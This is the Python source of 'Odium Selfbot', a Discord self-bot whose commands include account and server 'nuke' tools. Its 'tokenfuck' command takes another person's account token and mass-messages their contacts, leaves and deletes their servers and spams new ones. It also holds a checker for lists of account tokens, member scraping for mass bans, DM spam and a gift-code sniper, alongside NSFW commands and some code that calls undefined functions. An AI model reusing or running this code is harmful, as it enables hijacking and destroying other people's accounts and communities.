import asyncio
import base64
import concurrent
import ctypes
import datetime
import io
import multiprocessing
import random
import string
import threading
from asyncio import Queue
from idlelib.multicall import r
from itertools import cycle
from pathlib import Path
from random import randint
from tkinter import Image
from urllib import request, parse
import aiohttp
from bs4 import BeautifulSoup
import discord
import subprocess
import sys
import time
import re
import os
import colorama
import numpy
import urllib.parse
import urllib.request
import discord.utils
import sys
from certifi.__main__ import args
from discord import member
from requests import post
from urllib3.util import url
import json
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
import requests
from colorama import Fore
from discord.ext import commands, tasks

ctypes.windll.kernel32.SetConsoleTitleW('Odium Selfbot | Version 1.5 | Loading...')
os.system('mode con: cols=75 lines=15')

with open('config.json') as f:
    config = json.load(f)
token = config.get('token')
prefix = config.get('prefix')
giveaway_sniper = config.get('giveaway_sniper')
nitro_sniper = config.get('nitro_sniper')
stream_url = config.get('stream_url')
guild = config.get('guild')
bot = commands.Bot(command_prefix={prefix}, self_bot=True)
members = open('Backups/members.txt').read().split('\n')
proxieslol = open('UsingProxies.txt').read().split('\n')
proxs = cycle(proxieslol)
roles = open('Backups/roles.txt').read().split('\n')

is_selfbot = True

m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

colorama.init()
Odium = discord.Client()
Odium = commands.Bot(
    description='Odium Selfbot',
    command_prefix=prefix,
    self_bot=True
)
Odium.remove_command('help')

def startprint():
    if giveaway_sniper == True:
        giveaway = "Active"
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    print(f'''{Fore.RED}

                    {colorama.Fore.RED}╔═╗╔╦╗╦╦ ╦╔╦╗  ╔═╗╔═╗{colorama.Fore.WHITE}╦  ╔═╗╔╗ ╔═╗╔╦╗
                    {colorama.Fore.RED}║ ║ ║║║║ ║║║║  ╚═╗║╣ {colorama.Fore.WHITE}║  ╠╣ ╠╩╗║ ║ ║ 
                    {colorama.Fore.RED}╚═╝═╩╝╩╚═╝╩ ╩  ╚═╝╚═╝{colorama.Fore.WHITE}╩═╝╚  ╚═╝╚═╝ ╩ 
             {colorama.Fore.WHITE}─────────────────────────{colorama.Fore.RED}─────────────────────────
                           {colorama.Fore.WHITE}Created by [{colorama.Fore.RED}MajorRhine{colorama.Fore.WHITE}]
                           {colorama.Fore.WHITE}User: [{colorama.Fore.RED}{Odium.user.name}{colorama.Fore.WHITE}]
                           {colorama.Fore.WHITE}Prefix: [{colorama.Fore.RED}{prefix}{colorama.Fore.WHITE}]
                           {colorama.Fore.WHITE}Nitro Sniper: [{colorama.Fore.RED}{nitro}{colorama.Fore.WHITE}]
                           {colorama.Fore.WHITE}Giveaway Sniper: [{colorama.Fore.RED}{giveaway}{colorama.Fore.WHITE}]
                           {colorama.Fore.WHITE}Type {colorama.Fore.RED}{prefix}help {colorama.Fore.WHITE} to see commands
             {colorama.Fore.WHITE}─────────────────────────{colorama.Fore.RED}─────────────────────────
    ''' + Fore.WHITE)
    ctypes.windll.kernel32.SetConsoleTitleW(f'Odium Selfbot | Version 1.5  | Logged As: {Odium.user.name}')

def Clear():
    os.system('cls')


Clear()

def Init():
    if config.get('token') == "":
        Clear()
        print(f"{Fore.RED}[-] {Fore.WHITE}You didn't fill in your token in the config.json file" + Fore.WHITE)
    else:
        token = config.get('token')
        try:
            Odium.run(token, bot=False, reconnect=True)
        except discord.errors.LoginFailure:
            print(f"{Fore.RED}[-] {Fore.WHITE}Invalid Token Entered" + Fore.RESET)
            os.system('pause >NUL')


def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))


def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

async def starting():
    print(f"{Fore.GREEN}[-] {Fore.WHITE} Token Validated")
    sleep(1)
    print(f"{Fore.RED}[-] {Fore.WHITE} Loading [{Fore.RED}-{Fore.WHITE}]")
    await asyncio.sleep(0.5)
    Clear()
    print(f"{Fore.RED}[-] {Fore.WHITE} Loading [{Fore.RED}--{Fore.WHITE}]")
    await asyncio.sleep(0.5)
    Clear()
    print(f"{Fore.RED}[-] {Fore.WHITE} Loading [{Fore.RED}---{Fore.WHITE}]")
    await asyncio.sleep(0.5)
    Clear()
    print(f"{Fore.RED}[-] {Fore.WHITE} Loading [{Fore.RED}-{Fore.WHITE}]")
    await asyncio.sleep(0.5)
    Clear()
    print(f"{Fore.RED}[-] {Fore.WHITE} Loading [{Fore.RED}--{Fore.WHITE}]")
    await asyncio.sleep(0.5)
    Clear()
    print(f"{Fore.RED}[-] {Fore.WHITE} Loading [{Fore.RED}---{Fore.WHITE}]")
    await asyncio.sleep(0.5)
    Clear()
    print(f"{Fore.RED}[-] {Fore.WHITE} Loading [{Fore.RED}-{Fore.WHITE}]")
    await asyncio.sleep(0.5)
    Clear()
    print(f"{Fore.RED}[-] {Fore.WHITE} Loading [{Fore.RED}--{Fore.WHITE}]")
    await asyncio.sleep(0.5)
    Clear()
    print(f"{Fore.RED}[-] {Fore.WHITE} Loading [{Fore.RED}---{Fore.WHITE}]")
    await asyncio.sleep(0.5)
    Clear()
    print(f"{Fore.RED}[-] {Fore.WHITE} Welcome {Odium.user.name} To Odium Selfbot.")
    startprint()

@Odium.event
async def on_connect():
    Clear()

    if giveaway_sniper == True:
        giveaway = "Active"
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    await starting()

def makeguildxd(tokentouse,nukemsg):
    global serversmade

    data = {"name": nukemsg}
    headers={"authorization": tokentouse}

    servercreation = requests.post("https://discord.com/api/v8/guilds/templates/GC9sXUCX85P8",headers=headers,json=data).status_code
    if servercreation == 201:
        serversmade += 1


@Odium.command()
async def scrape(ctx):
    await ctx.message.delete()
    membercount = 0
    channelcount = 0
    rolecount = 0

    try:
        os.remove("Backups/members.txt")
        os.remove("Backups/channels.txt")
        os.remove("Backups/roles.txt")
    except:
        pass

    with open('Backups/members.txt', 'a') as f:
        ctx.guild.members
        for member in ctx.guild.members:
            f.write(str(member.id) + "\n")
            membercount += 1
        print(f"{Fore.GREEN}[-] {Fore.WHITE} Scraped {membercount} Member(s)")

    with open('Backups/channels.txt', 'a') as f:
        ctx.guild.channels
        for channel in ctx.guild.channels:
            f.write(str(channel.id) + "\n")
            channelcount += 1
        print(f"{Fore.GREEN}[-] {Fore.WHITE} Scraped {channelcount} Channel(s)")

    with open('Backups/roles.txt', 'a') as f:
        ctx.guild.roles
        for role in ctx.guild.roles:
            f.write(str(role.id) + "\n")
            rolecount += 1
        print(f"{Fore.GREEN}[-] {Fore.WHITE} Scraped {rolecount} Role(s)")

    print(f"{Fore.GREEN}[-] {Fore.WHITE}Finished! Restarting In 3 Seconds...")
    time.sleep(3)
    Clear()
    startprint()

def variant1(token):
    response = discord.get('https://discord.com/api/v6/auth/login', headers={"Authorization": token})#Bad variant for mass token check due to the rate limit.
    return True if response.status_code == 200 else False

def variant2(token):
    response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
        return False
    else:
        return True

def variant2_Status(token):
    response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if response.status_code == 401:
        return 'Invalid'
    elif "You need to verify your account in order to perform this action." in str(response.content):
        return 'Phone Lock'
    else:
        return 'Valid'

@Odium.command()
async def checktokens(ctx):
    await ctx.message.delete()
    try:
        checked = []
        with open('Checkers/checktokens.txt', 'r') as tokens:
            for token in tokens.read().split('\n'):
                if len(token) > 15 and token not in checked and variant2(token) == True:
                    print(f'{Fore.GREEN}[-] {Fore.WHITE}Valid Token: {token}')
                    checked.append(token)
                else:
                    print(f'{Fore.RED}[-] {Fore.WHITE}Invalid Token: {token}')
        if len(checked) > 0:
                name = randint(100000000, 9999999999)
                with open(f'Checkers/Results/tokenresults.txt', 'w') as saveFile:
                    saveFile.write('\n'.join(checked))
                print(f'{Fore.GREEN}[-] {Fore.WHITE}Tokens Saved To /Results/tokenresults.txt')
    except:
        print(f"{Fore.RED}[-] {Fore.WHITE}Error: Couldn't Import checktokens.txt")

@Odium.command()
async def proxies(ctx):
    await ctx.message.delete()
    file = open("UsingProxies.txt", "r")
    counter = 0
    Content = file.read()
    CoList = Content.split("\n")
    for i in CoList:
        if i:
            counter += 1
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Amount Of Proxies Loaded: {counter}")

@Odium.command()
async def bann():
    for m in members:
        threading.Thread(target=ban, args=(m,)).start()

@Odium.command()
async def dmall(ctx, *, nukemsg):
    await ctx.message.delete()
    headers = {"authorization": token}
    resp = requests.get("https://discord.com/api/v8/users/@me/channels", headers=headers)
    data = json.loads(resp.text)
    usersmessaged = int(0)

    for i in range(len(data)):
        messagesent = requests.post(f"https://discord.com/api/v8/channels/{data[i]['id']}/messages", headers=headers,
                                    json={"content": nukemsg})
        if messagesent.status_code == 200:
            usersmessaged += 1
        else:
            await asyncio.sleep(0.1)
        requests.delete(f"https://discord.com/api/v8/channels/{data[i]['id']}", headers=headers)
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Sent User {data[i]['id']}")

    print(f"{Fore.GREEN}[-] {Fore.WHITE}Sent {usersmessaged} People Direct Messages")

@Odium.command()
async def tokenfuck(ctx, tokentofrick=None, *, nukemsg=f"Account Nuked By Odium Selfbot! dsc.gg/odiumsec"):
    global serversmade
    serversmade = 0
    await ctx.message.delete()
    if tokentofrick == None:
        print(f"{Fore.RED}[-] {Fore.WHITE}Missing Arguments: token" + Fore.RESET)

    elif ctx.guild == None:
        print(f"{Fore.RED}[-] {Fore.WHITE}This Command Only Works In Private Servers" + Fore.RESET)

    else:
        embed = discord.Embed(title="Odium Selfbot - Confirm",description=f"Made By MajorRhine",color=0xff0000)
        embed.set_image(url="https://cdn.discordapp.com/attachments/535148317123018753/855525877240037376/2.gif")
        embed.set_footer(text="Token Fuck")
        message = await ctx.send(embed=embed)
        await message.add_reaction('✅')
        reactionstuffyes = True

        def requirements(reaction, user):
            return user == ctx.author and str(reaction.emoji) in ('✅') and message == message

        while reactionstuffyes:
            try:
                reaction, user = await Odium.wait_for('reaction_remove', timeout=10, check=requirements)
                embed = discord.Embed(title="Odium Selfbot - Success",description=f"You reacted, the process has started!\nToken Successfully Verified",color=0xff0000)
                embed.set_image(url="https://cdn.discordapp.com/attachments/535148317123018753/855525877240037376/2.gif")
                embed.set_footer(text="Token Fuck - Initiated")
                await message.edit(embed=embed)
                await message.clear_reactions()
                reactionstuffyes = False
                headers = {"authorization": tokentofrick}
                tokendata = requests.get("https://discord.com/api/v8/users/@me", headers=headers)
                if tokendata.status_code != 200:
                    print(f"{Fore.RED}[-] {Fore.WHITE}Error: {tokendata.text}")
                else:
                    print(f"{Fore.GREEN}[-] {Fore.WHITE}Valid Token: {tokentofrick}")

                    resp = requests.get("https://discord.com/api/v8/users/@me/channels", headers=headers)
                    data = json.loads(resp.text)
                    usersmessaged = int(0)

                    for i in range(len(data)):
                        messagesent = requests.post(f"https://discord.com/api/v8/channels/{data[i]['id']}/messages",headers=headers, json={"content": nukemsg})
                        if messagesent.status_code == 200:
                            usersmessaged += 1
                        else:
                            await asyncio.sleep(0.1)
                        requests.delete(f"https://discord.com/api/v8/channels/{data[i]['id']}", headers=headers)

                    print(f"{Fore.GREEN}[-] {Fore.WHITE}Sent {usersmessaged} People Direct Messages")

                    resp = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers)
                    data = json.loads(resp.text)
                    serversleft = int(0)

                    for i in range(len(data)):
                        serverleaving = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{data[i]['id']}",headers=headers).status_code
                        if serverleaving == 204:
                            serversleft += 1
                        else:
                            await asyncio.sleep(0.1)

                    print(f"{Fore.GREEN}[-] {Fore.WHITE}Left {serversleft} Servers")
                    randcolor = random.randint(0x000000, 0xFFFFFF)

                    resp = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers)
                    data = json.loads(resp.text)
                    serversdeleted = int(0)

                    for i in range(len(data)):
                        servdel = requests.post(f"https://discord.com/api/v8/guilds/{data[i]['id']}/delete",headers=headers, json={}).status_code
                        if servdel == 204:
                            serversdeleted += 1
                        else:
                            await asyncio.sleep(1)

                    print(f"{Fore.GREEN}[-] {Fore.WHITE}Deleted {serversdeleted} Servers")

                    for i in range(100):
                        threading.Thread(target=makeguildxd, args=(tokentofrick, nukemsg,)).start()
                        await asyncio.sleep(1)

                    print(f"{Fore.GREEN}[-] {Fore.WHITE}Created {serversmade} Servers")
                    print(f"{Fore.GREEN}[-] {Fore.WHITE}Token Successfully Nuked")

            except asyncio.TimeoutError:
                print(f"{Fore.RED}[-] {Fore.WHITE}Your Connection Timed Out")
                await message.clear_reactions()
                reactionstuffyes = False

            except asyncio.TimeoutError:
                print(f"{Fore.RED}[-] {Fore.WHITE}Your Connection Timed Out")
                await message.clear_reactions()
                reactionstuffyes = False

@Odium.command()
async def createservers(ctx, *, servername):
    await ctx.message.delete()
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
    'Content-Type': 'application/json',
    'Authorization': token,
    }
    guild = {
    'name': f"{servername}"
    }
    for i in range(100):
     requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
     print(f"{Fore.GREEN}[-] {Fore.WHITE}Server Created: {Fore.WHITE}{servername}")

@Odium.command()
async def fucku(ctx):
    comma = "**, **"
    members = [m.name for m in ctx.server.members]
    if len(ctx.server.members) < 32:
        msgchan = ctx.channel
        await main.say(msgchan, embed=discord.Embed(title="Users", description="{}, the current users are \n**{}**.".format(
        ctx.author.mention, comma.join(members)), colour=0X008CFF))
    else:
        await bot.send_message(ctx.author, embed=discord.Embed(title="Users",description="The current users in **{}** are \n**{}**.".format(ctx.server.name, comma.join(members)),colour=0X008CFF))

@Odium.command()
async def dog(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    em = discord.Embed()
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))

@Odium.command()
async def joke(ctx):  # b'\xfc'
    await ctx.message.delete()
    headers = {
        "Accept": "application/json"
    }
    async with aiohttp.ClientSession()as session:
        async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
            r = await req.json()
    await ctx.send(r["joke"])

@Odium.command()
async def hentai(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Odium.command()
async def boobs(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Odium.command()
async def tits(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Odium.command()
async def blowjob(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Odium.command()
async def coinflip(ctx):
    lista = ['head', 'tails']
    coin = random.choice(lista)
    try:
        if coin == 'head':
            embed= discord.Embed(color=0xff0000, title="Heads",timestamp=datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url="https://webstockreview.net/images/coin-clipart-dime-6.png")
            embed.set_footer(text="Coinflip")
            await ctx.send(embed=embed)
        else:
            embed= discord.Embed(color=0xff0000, title="Tails",timestamp=datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url="https://www.nicepng.com/png/full/146-1464848_quarter-tail-png-tails-on-a-coin.png")
            embed.set_footer(text="Coinflip")
            await ctx.send(embed=embed)
    except discord.HTTPException:
        if coin == 'head':
            await ctx.send("Coinflip: **Heads**")
        else:
            await ctx.send("Coinflip: **Tails**")



@Odium.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", colour=0xff0000)
    await ctx.send(embed=em)

@Odium.command()
async def fox(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    em = discord.Embed(title="Odium Selfbot", description="Made By MajorRhine", color=0xff0000)
    em.set_footer("Random Fox Image")
    em.set_image(url=r["image"])
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(r['image'])

@Odium.command()
async def listening(ctx, *,status: str=None):
    await ctx.message.delete()
    try:
        game = discord.Activity(type=2, name=f"{status}")
        await Odium.change_presence(activity=game)
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Set Listening Status To: {status}")
    except Exception as e:
        print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")

@Odium.command()
async def gamestatus(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Odium.change_presence(activity=game)

@Odium.command()
async def tweet(ctx, username: str, *, message: str): # b'\xfc'
    await ctx.message.delete()
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            em = discord.Embed(title="Odium Selfbot", description="Made By MajorRhine", color=0xff0000)
            em.set_footer("Tweet")
            em.set_image(url=res["message"])
            await ctx.send(embed=em)

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

languages = {
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

@Odium.command(aliases=['bitcoin'])
async def btc(ctx):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`', color=0xff0000)
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)

@Odium.event
async def on_command(ctx):
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Command Executed: {ctx.message.content}")

@Odium.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        await ctx.message.delete()
        print(f"{Fore.RED}[-] {Fore.WHITE}You don't have the required permissions" + Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.message.delete()
        print(f"{Fore.RED}[-] {Fore.WHITE}Missing Arguments: {error}" + Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        await ctx.message.delete()
        print(f"{Fore.RED}[-] {Fore.WHITE}Invalid Image" + Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        await ctx.message.delete()
        print(f"{Fore.RED}[-] {Fore.WHITE}Discord error: {error}" + Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        await ctx.message.delete()
        print(f"{Fore.RED}[-] {Fore.WHITE}Couldn't send a empty message" + Fore.RESET)
    else:
        await ctx.message.delete()
        print(f"{Fore.RED}[-] {Fore.WHITE}{error_str}" + Fore.RESET)


@Odium.event
async def on_message_edit(before, after):
    await Odium.process_commands(after)

@Odium.event
async def on_message(message):
    def GiveawayData():
        print(
            f"{Fore.GREEN}────────────────────────"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Channel: {message.channel}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Server: {message.guild}"
            f"\n{Fore.GREEN}────────────────────────"
            + Fore.RESET)

    def giveawaywon():
        print(
            f"{Fore.GREEN}────────────────────────"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Channel: {message.channel}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Server: {message.guild}"
            f"\n{Fore.GREEN}────────────────────────"
            + Fore.RESET)

    def NitroData(code):
        print(
            f"{Fore.GREEN}────────────────────────"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Server: {message.guild}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Channel: {message.channel}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Author: {message.author}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Code: {code}"
            f"\n{Fore.GREEN}────────────────────────"
            + Fore.RESET)

    def NitroDataWon(code):
        print(
            f"{Fore.GREEN}────────────────────────"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Server: {message.guild}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Channel: {message.channel}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Author: {message.author}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Code: {code}"
            f"\n{Fore.GREEN}────────────────────────"
            + Fore.RESET)

    if 'discord.gift/' in message.content:
        if nitro_sniper == True:
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')

            headers = {'Authorization': token}

            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                headers=headers,
            ).text

            if 'This gift has been redeemed already.' in r:
                print(f"{Fore.RED}[-] {Fore.WHITE}{code} - Code Already Redeemed" + Fore.RESET)
                NitroData(code)

            elif 'subscription_plan' in r:
                print(f"{Fore.GREEN}[-] {Fore.WHITE}{code} - Code Successfully Redeemed" + Fore.RESET)
                NitroDataWon(code)

            elif 'Unknown Gift Code' in r:
                print(f"{Fore.RED}[-] {Fore.WHITE}{code} - Uknown Code" + Fore.RESET)
                NitroData(code)
        else:
            return

    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                try:
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(f"{Fore.RED}[-] {Fore.WHITE}Giveaway Couldn't React" + Fore.RESET)
                    GiveawayData()
                print(f"{Fore.GREEN}[-] {Fore.WHITE}Giveaway Entered" + Fore.RESET)
                giveawaywon()
        else:
            return

    if f'Congratulations <@{Odium.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                print(f"{Fore.GREEN}[-] {Fore.WHITE}Giveaway Won" + Fore.RESET)
                GiveawayData()
        else:
            return
    await Odium.process_commands(message)

@Odium.command()
async def ascii(ctx, *, text):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```' + r + '```') > 2000:
        return
    await ctx.send(f"```{r}```")

@Odium.command()
async def nitrogen(ctx):
    await ctx.message.delete()

@Odium.command(aliases=['pfp', 'avatar'])
async def pfpsteal(ctx, *, user: discord.Member = None):  # b'\xfc'
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))

@Odium.command()
async def help(ctx):  # b'\xfc'
    await ctx.message.delete()
    embed = discord.Embed(title="Odium Selfbot", description="Made by MajorRhine", color=0xff0000)
    embed.set_image(url="https://cdn.discordapp.com/attachments/535148317123018753/855525877240037376/2.gif")
    embed.add_field(name=f"{prefix}nuke", value="View Nuke Commands", inline=False)
    embed.add_field(name=f"{prefix}account", value="Show Account Commands", inline=False)
    embed.add_field(name=f"{prefix}main", value="Show Main Commands", inline=False)
    embed.add_field(name=f"{prefix}main2", value="Show Page 2 Of Main Commands", inline=False)
    embed.add_field(name=f"{prefix}animated", value="Show Animated Commands", inline=True)
    embed.add_field(name=f"{prefix}art", value="Show Art Commands", inline=False)
    await ctx.send(embed=embed)

@Odium.command()
async def nuke(ctx):  # b'\xfc'
    await ctx.message.delete()
    embed = discord.Embed(title="Odium Selfbot", description="Made by MajorRhine", color=0xff0000)
    embed.set_image(url="https://cdn.discordapp.com/attachments/535148317123018753/855525877240037376/2.gif")
    embed.add_field(name=f"{prefix}odium_nuke", value="All In One Nuker", inline=True)
    embed.add_field(name=f"{prefix}ban [user]", value="Bans Certain User", inline=True)
    embed.add_field(name=f"{prefix}banall", value="Bans All Users", inline=True)
    embed.add_field(name=f"{prefix}unbanall", value="Unbans All Users", inline=True)
    embed.add_field(name=f"{prefix}kick [user]", value="Kicks Custom User", inline=True)
    embed.add_field(name=f"{prefix}kickall", value="Kicks All Users", inline=True)
    embed.add_field(name=f"{prefix}createroles [name]", value="Creates Max Roles", inline=True)
    embed.add_field(name=f"{prefix}delroles", value="Deletes All Roles", inline=True)
    embed.add_field(name=f"{prefix}createchannels [name]", value="Creates Max Channels", inline=True)
    embed.add_field(name=f"{prefix}customchannels [amount] [name]", value="Creates Custom Channels", inline=True)
    embed.add_field(name=f"{prefix}delchannels", value="Deletes All Channels", inline=True)
    embed.add_field(name=f"{prefix}spamwebhook", value="Spams Every Channel Using Webhook", inline=True)
    embed.add_field(name=f"{prefix}stopwebhook", value="Stops Webhook Spam", inline=True)
    embed.add_field(name=f"{prefix}channelspam [text]", value="Spams All Channels", inline=True)
    embed.add_field(name=f"{prefix}renamechannels [text]", value="Renames All Channels", inline=True)
    embed.set_footer(text="Nuke Commands")
    await ctx.send(embed=embed)

@Odium.command()
async def account(ctx):  # b'\xfc'
    await ctx.message.delete()
    embed = discord.Embed(title="Odium Selfbot", description="Made by MajorRhine", color=0xff0000)
    embed.set_image(url="https://cdn.discordapp.com/attachments/535148317123018753/855525877240037376/2.gif")
    embed.add_field(name=f"{prefix}odium_account", value="All In One Account Nuke", inline=True)
    embed.add_field(name=f"{prefix}createservers [name]", value="Creates Max Servers", inline=True)
    embed.add_field(name=f"{prefix}acceptall", value="Accepts All Friends Requests", inline=True)
    embed.add_field(name=f"{prefix}ignoreall", value="Ignores All Friends Requests", inline=True)
    embed.add_field(name=f"{prefix}delallfriends", value="Deletes All Friends", inline=True)
    embed.add_field(name=f"{prefix}blockall", value="Block All Friends", inline=True)
    embed.add_field(name=f"{prefix}unblocklist", value="Unblocks All Users In Your Blocklist", inline=True)
    embed.add_field(name=f"{prefix}leavegroups", value="Leave All Groups", inline=True)
    embed.add_field(name=f"{prefix}leaveservers", value="Leave All Servers", inline=True)
    embed.add_field(name=f"{prefix}delservers", value="Delete All Servers", inline=True)
    embed.add_field(name=f"{prefix}gamestatus", value="Sets Your Game Status", inline=True)
    embed.add_field(name=f"{prefix}watching", value="Sets Your Watching Status", inline=True)
    embed.add_field(name=f"{prefix}streaming", value="Sets Your Streaming Status", inline=True)
    embed.add_field(name=f"{prefix}listening", value="Sets Your Listening Status", inline=True)
    embed.add_field(name=f"{prefix}nickname [name]", value="Changes Your Nickname", inline=True)
    embed.add_field(name=f"{prefix}namefuck", value="Makes Your Name Retarded", inline=True)
    embed.add_field(name=f"{prefix}invisible", value="Makes Your Name Invisible", inline=True)
    embed.add_field(name=f"{prefix}whois", value="Shows Your Account Info", inline=True)
    embed.add_field(name=f"{prefix}tokenfuck [token]", value="Nukes Account", inline=True)
    embed.add_field(name=f"{prefix}tokeninfo [token]", value="Shows Info On A Token", inline=True)
    embed.add_field(name=f"{prefix}gentokens [amount]", value="Gens 150 Tokens On 3 Threads", inline=True)
    embed.add_field(name=f"{prefix}checktokens", value="Checks All Tokens In tokens.txt", inline=True)
    embed.add_field(name=f"{prefix}backupfriends", value="Self Explanatory", inline=True)
    embed.set_footer(text="Account Commands")
    await ctx.send(embed=embed)

@Odium.command()
async def whois(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    if ctx.guild != None:
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description="User Info Loaded", color=0xff0000)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
